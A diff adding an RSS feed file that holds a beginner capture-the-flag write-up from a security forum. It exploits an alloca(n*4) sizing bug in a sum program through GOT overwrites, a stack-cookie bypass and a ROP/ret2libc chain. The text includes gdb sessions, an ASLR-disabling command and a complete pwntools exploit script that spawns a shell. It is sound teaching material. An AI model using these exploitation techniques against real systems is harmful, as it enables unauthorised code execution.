@@ -1,0 +1,1403 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Punishing code with magic numbers with ROP and ret2libc on an x86_64</title>
+    <link>https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751</link>
+    <description># Punishing code with magic numbers with ROP and ret2libc on an x86_64
+**Difficulty: Beginner**
+
+**CTF: /zer0pts/pwn/protude** (ASLR is enabled here)
+
+## The vulnerable program
+
+This program takes an integer `N` and `N` other integers as input. Then it calculates and prints the sum of these numbers.
+A pretty standard exercise when you are learning a new programming language.
+
+
+We are going to attempt to exploit it get RCE. Take a few moments to absorb the code before moving on.
+
+
+
+```C
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+long n;
+
+long read_long() {
+  char buf[32];
+  int readByte;
+  memset(buf, 0, sizeof(buf));          // sets memory to 0
+  readByte = read(0, buf, sizeof(buf)); // reads 32 bytes of input
+  if (readByte == 0) {
+    puts(&quot;[ERROR] read failed&quot;);        // no bytes read = exit()
+    exit(1);
+  }
+  return atol(buf);                     // convert input to long
+}
+
+void setup() {
+  setbuf(stdin, NULL);
+  setbuf(stdout, NULL);
+  setbuf(stderr, NULL);
+}
+
+void calc_sum(void) {
+  long i;
+  long *array;
+  long result;
+  
+  array = (long*)alloca(n * 4);       
+
+  for(i = 0; 0 &lt;= i &amp;&amp; i &lt; n; i++) {
+    printf(&quot;num[%ld] = &quot;, i + 1);
+    array[i] = read_long();
+  }
+
+  for(result = 0, i = 0; i &lt; n; i++) {
+    result += array[i];
+  }
+
+  printf(&quot;SUM = %ld\n&quot;, result);
+}
+
+int main() {
+  setup();
+    
+  printf(&quot;n = &quot;);
+  n = read_long();
+  if (n &lt;= 0x00 || n &gt; 22) { // size has to be 1-22
+    puts(&quot;Invalid input&quot;);
+  } else {
+    calc_sum();
+  }
+  return 0;
+}
+```
+
+## Setup
+Let&#39;s set up a few things before we start:
+- Disable ASLR
+  ```bash
+  echo 0 &gt; /proc/sys/kernel/randomize_va_space
+  ```
+- Disable PIE (during compilation)
+- Enable DEP (during compilation)
+- Enable stack protector (during compilation)
+
+The binary is provided to you [here](http://s000.tinyupload.com/index.php?file_id=45318469853655576559).
+
+## Static Analysis
+### Inspecting code that handles user input.
+Let&#39;s take a closer look at the user input function.
+
+```c
+long read_long() {
+  char buf[32];
+  int readByte;
+  memset(buf, 0, sizeof(buf));          // sets memory to 0
+  readByte = read(0, buf, sizeof(buf)); // reads 32 bytes of input
+  if (readByte == 0) {
+    puts(&quot;[ERROR] read failed&quot;);        // no bytes read = exit()
+    exit(1);
+  }
+  return atol(buf);                     // convert input to long
+}
+```
+
+We have a buffer of 32 bytes. `read(0, buf, sizeof(buf))` reads **at most** 32 characters. Therefore, there is **no way to overwrite the stack using read.** : (
+
+We have an interesting call to `atol(buf)` at the end, but we cannot get anything out of it. The function will simply return `0` on any suspicious input. 
+
+Although the function implementation uses bad practices, we don&#39;t have anything interesting going on.
+
+### Inspecting the function that calculates the sum.
+
+```C
+void calc_sum(void) {
+  long i;
+  long *array;
+  long result;
+  
+  array = (long*)alloca(n * 4);       
+
+  for(i = 0; 0 &lt;= i &amp;&amp; i &lt; n; i++) {
+    printf(&quot;num[%ld] = &quot;, i + 1);
+    array[i] = read_long();
+  }
+
+  for(result = 0, i = 0; i &lt; n; i++) {
+    result += array[i];
+  }
+
+  printf(&quot;SUM = %ld\n&quot;, result);
+}
+
+```
+
+If you are unfamiliar with `alloca`, `man 3 alloca` to check the manual page for it.
+
+&gt; The alloca()  function allocates size bytes of space in the stack frame of the caller.  This temporary space  is  automatically  freed  when the function that called alloca() returns to its caller
+
+`alloca` allocates memory **in the stack frame of the caller**, in this case, `calc_sum`.
+
+**This is an interesting choice.** Usually, people use `malloc` to allocate space at runtime. But in this case, since `n` is bound to 1-22, it is not too bad. Too much stack space is **not** used.
+
+Then, N integers that are read from `read_long()` are placed in the memory we allocated.
+The sum is calculated and the result is printed. Not too much going here as well.
+
+**If you want to figure out the vulnerability on your own, stop here.**
+
+
+## Introducing magic numbers
+
+&gt; The term [magic number](https://en.wikipedia.org/wiki/Magic_number_(programming)) or magic constant refers to the anti-pattern of using numbers directly in source code
+
+The use of magic numbers is often frowned upon. They make your code difficult to understand and often introduce subtle bugs.
+
+Take a look at the following piece of code from Wikipedia.
+
+```C
+   for i from 1 to 52
+       j := i + randomInt(53 - i) - 1
+       a.swapEntries(i, j)
+```
+52 and 53 (and most other numbers which has no meaning in local context) is a magic number.
+In this above case, the only problem this poses is a slight annoyance over the mysterious 52. Cases like the following, however, may create portability issues.
+
+```c
+const int array_size = 20;
+int *ptr = (int*) malloc(array_size * 4);
+```
+Here, 4 is the magic number. The peice of code above executes properly in systems where the `sizeof (int) == 4`. But if it is 2, it breaks miserably when we attempt to use `ptr`.
+
+If we were to write this properly, we would use something like.
+```c
+const int array_size = 20;
+int *ptr = (int*) malloc(array_size * sizeof (int));
+```
+
+Okay, now you are equipped with the knowledge of magic numbers! Let us approach this problem again.
+
+## Finding an arbitrary write.
+
+Take a look at:
+```c
+  array = (long*) alloca(n * 4);       
+```
+This is the exact portability issue that we discussed earlier.
+Only `sizeof(char)` is fixed as 1 by the C standard. Everything else usually only has minimum size requirements. The compiler can choose whatever size it sees is the best.
+Usually, in x86_64 compilers make the `sizeof(long) == 8`. This is convenient because a `long` will fit in a register. 
+
+**In this case, sizeof(long) == 8**
+
+So we have allocated space like `alloca(n * 4);` yet the `sizeof(long) == 8` (In x86_64, this is usually the case).
+
+Therefore, we are only allocating enough memory for `n/2` longs. Yet, we access all `n` of them. We are accessing memory not allocated for us! Also, **we can write to that memory.**
+
+Even more convenient is the fact that `alloca`  was used. The extra memory we are addressing is on the stack.
+
+The stack frame will usually look like this for the `calc_sum` function.
+```
+-----------------------------------------
+|      Arguments to the function        |
+-----------------------------------------
+|           Return Address              |
+-----------------------------------------
+|      Local variables of calc_sum      |
+-----------------------------------------
+|          Alloca(n*4) buffer           |
+-----------------------------------------
+```
+
+We can potentially overwrite the local variable `array` to achieve arbitrary write!
+
+## Exploiting the arbitrary write once.
+
+Let&#39;s fire up gdb:
+```c
+gdb-peda$ r
+n = 21
+num[1] = 
+num[2] = 
+num[3] = 
+num[4] = 
+... 
+num[15] = 
+num[2] = 
+```
+We use n = 21. *Note that n is restricted to 1-22 (re-read the code if you are confused).*
+
+I just pass it empty strings so that `num[1]` through `num[15]` will be equal to 0.
+
+We notice that after `num[15]`, we loop back to `num[2]`.
+We have overwritten the local variable `i`!
+
+Since we have overwritten the local variable `i` with 0, we again start the loop from 2. (i++ is done at the end and printf() uses i+1).
+
+We are looping indefinitely.
+
+But, looping indefinitely is not useful to us.
+To write to memory beyond this, we override the `i` with 14 (exactly the current index).
+So that in the next iteration we get to `num[16]`.
+
+```C
+gdb-peda$ r
+n = 21
+num[1] = 
+...
+num[15] = 14
+num[16] = 
+```
+We can now write past the limit and override `*array` in the next iteration! Then write to `*(array+n)` in the iteration after that!. That means since we control `array` we can write to anywhere we wish.
+
+Let&#39;s try to override the `printf`&#39;s [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) entry to point to the `puts()` call in the code to test things.
+
+First, we get the GOT entry of `printf`.
+
+```c
+gdb-peda$ x/i printf
+   0x400690 &lt;printf@plt&gt;:
+    jmp    QWORD PTR [rip+0x20099a]        #0x601030
+
+```
+`0x601030` is the GOT offset of printf
+
+We then get the location where the `puts` call is made. 
+
+```c
+gdb-peda$ disass read_long
+Dump of assembler code for function read_long:
+   0x00000000004007c7 &lt;+0&gt;:     push   rbp
+   0x00000000004007c8 &lt;+1&gt;:     mov    rbp,rsp
+   ...
+   0x0000000000400813 &lt;+76&gt;:    lea    rdi,[rip+0x28a]        # 0x400aa4
+   0x000000000040081a &lt;+83&gt;:    call   0x400660 &lt;puts@plt&gt;
+   ...
+   End of assembler dump.
+```
+`0x000000000040081a` is the place we want the GOT offset to point to.
+
+So we override the value at `0x601030` with `0x000000000040081a`
+
+```C
+gdb-peda$ r
+n = 21
+num[1] =
+...
+num[15] = 14
+num[16] = 
+num[17] = 6295464
+num[18] = 4196378
+num[%ld] = 
+[Inferior 1 (process 16567) exited with code 01]
+
+```
+
+As you can see, `num[%ld] = ` was printed without formatting. Awesome.
+`printf@plt` jumped to `call puts@plt` (and the `call exit@plt` next).
+
+**But wait a minute....**
+The careful reader might have noticed, 
+`0x601030 = 6295600`
+But we have used, `6295464` in gdb which is `0x601030 - 17*8`
+
+**Why so?**
+This is because in the next iteration we override the value at `array[17]` not `array[0]` therefore we correct the address by subtracting with `17 * sizeof(long)`
+
+
+With this, we have achieved arbitrary write!!
+
+As of right now, we can only overwrite to memory once. But, it is still a step in the right direction.
+
+## Overwriting to memory more than once.
+In order to overwrite to arbitrary memory more than once, we need to find a way to jump to the top of the `calc_sum()` function whenever we want.
+We will do this with a GOT entry overwrite.
+
+Take a look at the following code from `read_long`.
+```c
+  readByte = read(0, buf, sizeof(buf)); // reads 32 bytes of input
+  if (readByte == 0) {
+    puts(&quot;[ERROR] read failed&quot;);        // no bytes read = exit()
+    exit(1);
+  }
+```
+
+Bring up the man page of `read`: `man 2 read`.
+&gt; On success, the number of bytes read is  returned  (zero  indicates the end  of file)
+
+The if block only executes when we provide EOF to the input stream. If we overwrite either the `puts` or the `exit` GOT entry to point to the top of the `calc_sum` function, we can send an EOF to jump to the top of the function. This will allow us to overwrite regions of memory multiple times.
+
+The relevant info:
+```c
+calc_sum = 0x40088e = 4196494
+puts@got = 0x601018 
+```
+
+Again, we need to overwrite the correct address so we correct the address `0x601018` so that `array[17]` will point to `0x601018`
+
+```C
+0x601018 - 17*8 = 6295440
+```
+```c
+gdb-peda$ r
+n = 21
+num[1] = 
+...
+num[15] = 14
+num[16] = 
+num[17] = 6295440
+num[18] = 4196494
+num[19] = num[1] = 
+```
+I used `CTRL + D` to send a EOF to the terminal. We can see the output `num[1]`. We jumped to the start of the `calc_sum` again!
+We can use this to overwrite to memory any number of times.
+
+
+## ROP and ret2libc
+
+In this challenge, we have DEP and stack cookies that protect executing stack space and checking if the stack frame has been overwritten.
+
+Most of the time, we **do not have** a space in a process that is both **writable and executable**.
+For instance let&#39;s check for our current executable.
+```c
+[gnik@tinybot ~/]$ ./thebinary &amp;
+n =                                 
+[gnik@tinybot ~/]$ ps aux | grep thebinary
+gnik     16890  0.0  0.0  10696  1040 pts/1    t    16:01   0:00 /home/gnik/thebinary
+[gnik@tinybot ~/]$ pmap 16890
+16890:   /home/gnik/thebinary
+0000000000400000      4K r-x-- thebinary
+0000000000600000      4K r---- thebinary
+0000000000601000      4K rw--- thebinary
+00007ffff73ba000    104K r-x-- libpthread-2.27.so
+00007ffff73d4000   2044K ----- libpthread-2.27.so
+00007ffff75d3000      4K r---- libpthread-2.27.so
+00007ffff75d4000      4K rw--- libpthread-2.27.so
+00007ffff75d5000     16K rw---   [ anon ]
+00007ffff75d9000     12K r-x-- libdl-2.27.so
+00007ffff75dc000   2044K ----- libdl-2.27.so
+00007ffff77db000      4K r---- libdl-2.27.so
+00007ffff77dc000      4K rw--- libdl-2.27.so
+00007ffff77dd000   1948K r-x-- libc-2.27.so
+00007ffff79c4000   2048K ----- libc-2.27.so
+00007ffff7bc4000     16K r---- libc-2.27.so
+00007ffff7bc8000      8K rw--- libc-2.27.so
+00007ffff7bca000     16K rw---   [ anon ]
+00007ffff7bce000     24K r-x-- libgtk3-nocsd.so.0
+00007ffff7bd4000   2044K ----- libgtk3-nocsd.so.0
+00007ffff7dd3000      4K r---- libgtk3-nocsd.so.0
+00007ffff7dd4000      4K rw--- libgtk3-nocsd.so.0
+00007ffff7dd5000    156K r-x-- ld-2.27.so
+00007ffff7fbe000     16K rw---   [ anon ]
+00007ffff7ff7000     12K r----   [ anon ]
+00007ffff7ffa000      8K r-x--   [ anon ]
+00007ffff7ffc000      4K r---- ld-2.27.so
+00007ffff7ffd000      4K rw--- ld-2.27.so
+00007ffff7ffe000      4K rw---   [ anon ]
+00007ffffffde000    132K rw---   [ stack ]
+ffffffffff600000      4K r-x--   [ anon ]
+ total            10700K
+
+```
+
+As you can see, **none of them have both the write and execute bit set**.
+
+This is a pretty common security measure, so we cannot write shellcode to a certain memory region and jump to it.
+
+This is where [ret2libc](https://en.wikipedia.org/wiki/Return-to-libc_attack) and [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) come into play.
+
+With **ret2libc** we are jumping to certain points in the libc library that is loaded at runtime. For instance, we can jump to potentially dangerous places like `system()` which is present in `libc`.
+
+With **ROP** we jump to small code segments in the address space of the process that does a certain task before jumping to a different segment. Chaining a bunch of these ROP *gadgets* can hence be very powerful.
+
+Our plan to achieve RCE is as follows:
+- Find the address of system() in libc
+- Find the address of the string &#39;/bin/sh/` lin libc
+- Find a ROP gadget that can place the address of the `/bin/sh` string in the rdi register. 
+- Jump to system()
+
+Finding the address of system() and the string &#39;/bin/sh&#39; is pretty straight forward.
+
+```c
+gdb-peda$ start
+....
+Temporary breakpoint 1, 0x00000000004009bd in main ()
+gdb-peda$ p system
+$1 = {int (const char *)} 0x7ffff782c440 &lt;__libc_system&gt;
+```
+```c
+gdb-peda$ info proc map
+process 17653
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+      .......
+      .......
+      0x7ffff77dd000     0x7ffff79c4000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff79c4000     0x7ffff7bc4000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7bc4000     0x7ffff7bc8000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7bc8000     0x7ffff7bca000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
+      0x7ffff7bca000     0x7ffff7bce000     0x4000        0x0 
+      0x7ffff7bce000     0x7ffff7bd4000     0x6000        0x0 /usr/lib/x86_64-linux-gnu/libgtk3-nocsd.so.0
+      .......
+      .......
+gdb-peda$ find  &#39;/bin/sh&#39; 0x7ffff77dd000 0x7ffff79c4000
+Searching for &#39;/bin/sh&#39; in range: 0x7ffff77dd000 - 0x7ffff79c4000
+Found 1 results, display max 1 items:
+libc : 0x7ffff7990e9a --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)
+```
+
+
+**The system() function is present in `0x7ffff782c440`**
+**Address of the string &#39;/bin/sh&#39; is `0x7ffff7990e9a`**
+
+**These addresses are most likely different for your machine**
+
+## Learning to write exploit scripts.
+**Sufficient knowledge of python is assumed, although not necessary to understand this section.**
+
+There are a lot of ways to write your exploit scripts.
+I will keep things simple and write one in using `python3` and [pwntools](http://docs.pwntools.com/en/stable/)
+
+We will do everything we have done so far with gdb in python.
+
+Create a new python script.
+```py
+import pwn
+import tty
+```
+You can install `pwntools` with pip and `import pwn` to work with it. We will also be using some constants from `tty`
+
+```py
+p = pwn.process(&#39;./thebinary&#39;, stdin=pwn.PTY, raw = False)
+
+# g = pwn.gdb.attach(p, &quot;&quot;&quot;
+# &quot;&quot;&quot;)
+```
+This is how you start a local process in `pwntools`. **Note the `raw = False` and `stdin=pwn.PTY`!**
+These options are essential to our current project since we write EOF to stream and not close our stream. (Yes this sounds weird, but this is necessary.) 
+You can experiment with attaching the debugger by uncommenting some lines here.
+
+```py
+def setup():
+    p.sendline(&#39;21&#39;)
+
+def write_junk(count):
+    for x in range(count):
+        p.sendline(&#39;&#39;)
+
+def overwrite_memory(addr, data):
+    p.sendline(&#39;14&#39;)
+    p.sendline(&#39;&#39;)
+    p.sendline(str(addr))
+    p.sendline(str(data))
+
+
+def send_eof():
+    &quot;&quot;&quot;
+    Note Send EOF sends 2 bytes!!!
+    &quot;&quot;&quot;
+    p.sendline(chr(tty.CEOF))
+```
+
+These are some of the functions that will be useful to us. The functions are self-explanatory. If you have never written an exploit before with pwntools, feel free to experiment here. `p.sendline()` is used to send a line to the process.
+
+```py
+
+setup()
+&quot;&quot;&quot;
+Overwrite the GOT of puts for the ability to write memory many times
+&quot;&quot;&quot;
+write_junk(14)
+# 0x40088e = calc_sum
+# 0x601018 = GOT of puts
+# Overwrite GOT of puts with calc_sum
+overwrite_memory(0x601018 - 17*8, 0x40088e)
+send_eof()
+
+p.interactive()
+```
+
+Okay, so now that all that is over, we will first overwrite the GOT entry of `puts` with `calc_sum` so that we can use EOF to jump to it again. Our nifty little `overwrite_memory()` function makes this easier.
+
+The `p.interactive()` at the end is used to make the process interactive. After this, you can use the terminal for IO.
+
+I recommend you experiment with the script.
+
+
+## Things that are necessary for the exploit to work.
+These are some things that will be useful to us as we move on to ROP.
+
+1) Overwrite the GOT entry of `__stack_chk_fail` to point to the `leaveq; ret` instruction in `calc_sum` to bypass stack smashing check.
+2) Overwrite the value of n to 30 so that we can overwrite more memory at once. (This is used in the ROP step later)
+
+I will not show this in gdb since I have already shown you how to overwrite arbitrary memory, and the writeup will be pretty repetitive if I include this. 
+
+If you are confused, please refer to the code snippet below from the exploit script.
+```py
+&quot;&quot;&quot;
+Overwrite the GOT of __stack_chk_fail for beating the stack cookie
+&quot;&quot;&quot;
+write_junk(13)
+# 0x601020 = GOT of __stack_chk_fail
+# 0x4009b3 = leaveq retq instruction in calc_sum, essentially beating the stack_chk_fail
+overwrite_memory(0x601020 - 17*8, 0x4009b3)
+send_eof()
+
+&quot;&quot;&quot;
+Overwrite global n to overwrite more data on the stack
+&quot;&quot;&quot;
+write_junk(13)
+# n = 0x6010b0
+# Overwrite n with 30
+overwrite_memory(0x6010b0 - 17*8, 30)
+send_eof()
+
+```
+
+
+## Finding the necessary ROP gadgets
+
+I use [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) tool to find the necessary ROP gadgets from the executable. You can use the plethora of alternatives available to you. (gdb-peda also has one!)
+
+```
+[gnik@tinybot ~/]$ 
+ROPgadget --binary thebinary 
+...
+0x0000000000400a83 : pop rdi ; ret
+...
+0x0000000000400646 : ret
+...
+
+Unique gadgets found: 112
+
+```
+
+We will need two ROP gadgets, `pop rdi; ret` and `ret`.
+`pop rdi; ret` to load the address of the string into the `rdi` register and then `ret` gadget to align the stack address for the `movqs` instruction. (The reason this is necessary is left as an exercise.)
+
+
+## Writing the final exploit script.
+We finally have all the tools that we need to write a final exploit script.
+
+
+The final exploit script looks something like.
+```py
+import pwn
+import tty
+
+p = pwn.process(&#39;./thebinary&#39;, stdin=pwn.PTY, raw = False)
+
+#g = pwn.gdb.attach(p, &quot;&quot;&quot;
+#b *0x00000000004009b8
+#c
+#&quot;&quot;&quot;)
+
+def setup():
+    p.sendline(&#39;21&#39;)
+
+def write_junk(count):
+    for x in range(count):
+        p.sendline(&#39;&#39;)
+
+def overwrite_memory(addr, data):
+    p.sendline(&#39;14&#39;)
+    p.sendline(&#39;&#39;)
+    p.sendline(str(addr))
+    p.sendline(str(data))
+
+
+def send_eof():
+    &quot;&quot;&quot;
+    Note Send EOF sends 2 bytes!!!
+    &quot;&quot;&quot;
+    p.sendline(chr(tty.CEOF))
+
+
+setup()
+&quot;&quot;&quot;
+Overwrite the GOT of puts for the ability to write memory many times
+&quot;&quot;&quot;
+write_junk(14)
+# 0x40088e = calc_sum
+# 0x601018 = GOT of puts
+# Overwrite GOT of puts with calc_sum
+overwrite_memory(0x601018 - 17*8, 0x40088e)
+send_eof()
+
+
+&quot;&quot;&quot;
+Overwrite the GOT of __stack_chk_fail for beating the stack cookie
+&quot;&quot;&quot;
+write_junk(13)
+# 0x601020 = GOT of __stack_chk_fail
+# 0x4009b3 = leaveq retq instruction in calc_sum, essentially beating the stack_chk_fail
+overwrite_memory(0x601020 - 17*8, 0x4009b3)
+send_eof()
+
+&quot;&quot;&quot;
+Overwrite global n to overwrite more data on the stack
+&quot;&quot;&quot;
+write_junk(13)
+# n = 0x6010b0
+# Overwrite n with 30
+overwrite_memory(0x6010b0 - 17*8, 30)
+send_eof()
+
+
+&quot;&quot;&quot;
+Overwrite the stack with ROP chain for ret2libc
+&quot;&quot;&quot;
+write_junk(17)
+p.sendline(&#39;24&#39;)
+# 0x400a83 : pop rdi ; ret
+p.sendline(str(0x400a83))
+
+# /bin/sh = 0x7ffff7990e9a
+p.sendline(str(0x7ffff7990e9a))
+
+# 0x00400646 = ret
+# This is needed because the movaps instruction must be properly aligned.
+p.sendline(str(0x00400646))
+
+# system() = 0x7ffff782c440
+p.sendline(str(0x7ffff782c440))
+p.sendline(&quot;&quot;)
+p.interactive()
+```
+
+Most of the script has already been discussed.
+Let us focus on the rest that remains.
+
+```py
+&quot;&quot;&quot;
+Overwrite the stack with ROP chain for ret2libc
+&quot;&quot;&quot;
+write_junk(17)
+p.sendline(&#39;24&#39;)
+# 0x400a83 : pop rdi ; ret
+p.sendline(str(0x400a83))
+
+# /bin/sh = 0x7ffff7990e9a
+p.sendline(str(0x7ffff7990e9a))
+
+# 0x00400646 = ret
+# This is needed because the movaps instruction must be properly aligned.
+p.sendline(str(0x00400646))
+
+# system() = 0x7ffff782c440
+p.sendline(str(0x7ffff782c440))
+p.sendline(&quot;&quot;)
+p.interactive()
+```
+
+**The first question that needs to be answered: Why have some constants changed?**
+`write_junk(13)` was used while overwriting memory the last time why is `write_junk(17)` used this time?
+
+This is due to the fact that `n = 21` in all previous cases but we have just recently overwritten `n = 30` so that we can overwrite more of the stack. Hence, the offsets at which the local variable `i` is overwritten has changed.
+You can experiment with the same method used above to figure out the offset when n = 30.
+
+
+Okay, now let&#39;s discuss the **ROP** part of the exploit.
+```py
+# 0x400a83 : pop rdi ; ret
+p.sendline(str(0x400a83))
+
+# /bin/sh = 0x7ffff7990e9a
+p.sendline(str(0x7ffff7990e9a))
+
+# 0x00400646 = ret
+# This is needed because the movaps instruction must be properly aligned.
+p.sendline(str(0x00400646))
+
+# system() = 0x7ffff782c440
+p.sendline(str(0x7ffff782c440))
+```
+To set up our exploit, we overwrite the stack to the point where we can overwrite the return address.
+We then place the address of the `pop rdi; ret` ROP gadget followed by the address to the `/bin/sh` string. 
+
+When the function returns, it jumps to execute `pop rdi; ret`. Since the address of the string is on the stack, `pop rdi` places the address of the string in the rdi register. And then we `ret` to another address......
+
+..... The address we jump to is the address of `ret` instruction. `ret` gadget is used to align our stack. (This is necessary since movaps instruction (used by system()) needs the stack to be 16 bit aligned.). `ret` is a NOP in ROP (a gadget that does nothing). 
+
+**Note that this might not be necessary if your stack is already 16 bit aligned.**
+
+We then place the address of the system call on the stack. The `ret` gadget then pops this address off the stack and then jumps to system() in libc.
+
+We have successfully placed the address of the string &#39;/bin/sh&#39; in `rdi` and then jumped to system()!
+
+**Wait... There is more...**
+Remember we overwrote the GOT entry of __stack_chk__fail so that the stack cookie check would unconditionally return to `leaveq; ret`
+Since we have overwritten the return address, we have surely overwritten the stack cookie.
+Therefore, if we hadn&#39;t overwritten the GOT entry of `__stack_chk_fail` our exploit would have failed.
+
+
+**We can also overwrite a GOT entry and jump using that to avoid this**.
+
+## Putting it all together
+
+```fish
+[gnik@tinybot ~/]$ python3 exploit.py
+[+] Starting local process &#39;./thebinary&#39;: pid 18969
+[*] Switching to interactive mode
+n = 21
+....
+....
+SUM = -3105548685935727921
+$ $ whoami
+whoami
+gnik
+```
+
+
+**This is my first post here in 0x00sec, so any feedback would be helpful. In an upcoming writeup, we will exploit the same executable but with ASLR enabled. : )**</description>
+    
+    <lastBuildDate>Fri, 13 Mar 2020 05:03:44 +0000</lastBuildDate>
+    <category>Exploit Development</category>
+    <atom:link href="https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Punishing code with magic numbers with ROP and ret2libc on an x86_64</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751/3</link>
+        <pubDate>Fri, 10 Jul 2020 20:55:27 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-19751-3</guid>
+        <source url="https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751.rss">Punishing code with magic numbers with ROP and ret2libc on an x86_64</source>
+      </item>
+      <item>
+        <title>Punishing code with magic numbers with ROP and ret2libc on an x86_64</title>
+        <dc:creator><![CDATA[n00bi3s]]></dc:creator>
+        <description><![CDATA[
+            <p>I loved this article! Thanks for sharing! I would love to learn more around similar things <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751/2</link>
+        <pubDate>Fri, 13 Mar 2020 05:03:44 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-19751-2</guid>
+        <source url="https://d.clarkee.co.uk/t/punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86-64/19751.rss">Punishing code with magic numbers with ROP and ret2libc on an x86_64</source>
+      </item>
+      <item>
+        <title>Punishing code with magic numbers with ROP and ret2libc on an x86_64</title>
+        <dc:creator><![CDATA[GnikDroy]]></dc:creator>
+        <description><![CDATA[
+            <h1><a name="p-54170-punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86_64-1" class="anchor" href="https://d.clarkee.co.uk#p-54170-punishing-code-with-magic-numbers-with-rop-and-ret2libc-on-an-x86_64-1"></a>Punishing code with magic numbers with ROP and ret2libc on an x86_64</h1>
+<p><strong>Difficulty: Beginner</strong></p>
+<p><strong>CTF: /zer0pts/pwn/protude</strong> (ASLR is enabled here)</p>
+<h2><a name="p-54170-the-vulnerable-program-2" class="anchor" href="https://d.clarkee.co.uk#p-54170-the-vulnerable-program-2"></a>The vulnerable program</h2>
+<p>This program takes an integer <code>N</code> and <code>N</code> other integers as input. Then it calculates and prints the sum of these numbers.<br>
+A pretty standard exercise when you are learning a new programming language.</p>
+<p>We are going to attempt to exploit it get RCE. Take a few moments to absorb the code before moving on.</p>
+<pre data-code-wrap="C"><code class="lang-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+long n;
+
+long read_long() {
+  char buf[32];
+  int readByte;
+  memset(buf, 0, sizeof(buf));          // sets memory to 0
+  readByte = read(0, buf, sizeof(buf)); // reads 32 bytes of input
+  if (readByte == 0) {
+    puts("[ERROR] read failed");        // no bytes read = exit()
+    exit(1);
+  }
+  return atol(buf);                     // convert input to long
+}
+
+void setup() {
+  setbuf(stdin, NULL);
+  setbuf(stdout, NULL);
+  setbuf(stderr, NULL);
+}
+
+void calc_sum(void) {
+  long i;
+  long *array;
+  long result;
+  
+  array = (long*)alloca(n * 4);       
+
+  for(i = 0; 0 &lt;= i &amp;&amp; i &lt; n; i++) {
+    printf("num[%ld] = ", i + 1);
+    array[i] = read_long();
+  }
+
+  for(result = 0, i = 0; i &lt; n; i++) {
+    result += array[i];
+  }
+
+  printf("SUM = %ld\n", result);
+}
+
+int main() {
+  setup();
+    
+  printf("n = ");
+  n = read_long();
+  if (n &lt;= 0x00 || n &gt; 22) { // size has to be 1-22
+    puts("Invalid input");
+  } else {
+    calc_sum();
+  }
+  return 0;
+}
+</code></pre>
+<h2><a name="p-54170-setup-3" class="anchor" href="https://d.clarkee.co.uk#p-54170-setup-3"></a>Setup</h2>
+<p>Let’s set up a few things before we start:</p>
+<ul>
+<li>Disable ASLR<pre data-code-wrap="bash"><code class="lang-bash">echo 0 &gt; /proc/sys/kernel/randomize_va_space
+</code></pre>
+</li>
+<li>Disable PIE (during compilation)</li>
+<li>Enable DEP (during compilation)</li>
+<li>Enable stack protector (during compilation)</li>
+</ul>
+<p>The binary is provided to you <a href="http://s000.tinyupload.com/index.php?file_id=45318469853655576559" rel="noopener nofollow ugc">here</a>.</p>
+<h2><a name="p-54170-static-analysis-4" class="anchor" href="https://d.clarkee.co.uk#p-54170-static-analysis-4"></a>Static Analysis</h2>
+<h3><a name="p-54170-inspecting-code-that-handles-user-input-5" class="anchor" href="https://d.clarkee.co.uk#p-54170-inspecting-code-that-handles-user-input-5"></a>Inspecting code that handles user input.</h3>
+<p>Let’s take a closer look at the user input function.</p>
+<pre data-code-wrap="c"><code class="lang-c">long read_long() {
+  char buf[32];
+  int readByte;
+  memset(buf, 0, sizeof(buf));          // sets memory to 0
+  readByte = read(0, buf, sizeof(buf)); // reads 32 bytes of input
+  if (readByte == 0) {
+    puts("[ERROR] read failed");        // no bytes read = exit()
+    exit(1);
+  }
+  return atol(buf);                     // convert input to long
+}
+</code></pre>
+<p>We have a buffer of 32 bytes. <code>read(0, buf, sizeof(buf))</code> reads <strong>at most</strong> 32 characters. Therefore, there is <strong>no way to overwrite the stack using read.</strong> : (</p>
+<p>We have an interesting call to <code>atol(buf)</code> at the end, but we cannot get anything out of it. The function will simply return <code>0</code> on any suspicious input.</p>
+<p>Although the function implementation uses bad practices, we don’t have anything interesting going on.</p>
